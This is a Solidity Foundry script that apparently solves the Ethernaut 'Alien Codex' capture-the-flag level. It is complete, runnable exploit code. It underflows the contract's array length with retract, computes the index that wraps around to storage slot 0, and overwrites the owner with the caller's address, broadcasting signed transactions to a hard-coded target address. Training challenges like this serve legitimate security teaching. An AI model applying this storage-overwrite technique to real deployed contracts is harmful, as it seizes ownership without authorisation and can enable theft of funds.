// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface IAlienCodex {
    function makeContact() external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract AlienCodexSolution is Script {

    function run() external {
        address target = 0xd024503dD8CdA21062Ed58B2972255430A087331;

        // ✅ Correct way to get your wallet address
        address player = vm.addr(vm.envUint("PRIVATE_KEY"));

        IAlienCodex alien = IAlienCodex(target);

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // 1. Enable contact
        alien.makeContact();

        // 2. Underflow array length
        alien.retract();

        // 3. Calculate index → slot 0
        uint256 index =
            type(uint256).max -
            uint256(keccak256(abi.encode(uint256(1)))) + 1;

        // 4. Overwrite owner
        alien.revise(index, bytes32(uint256(uint160(player))));

        vm.stopBroadcast();
    }
}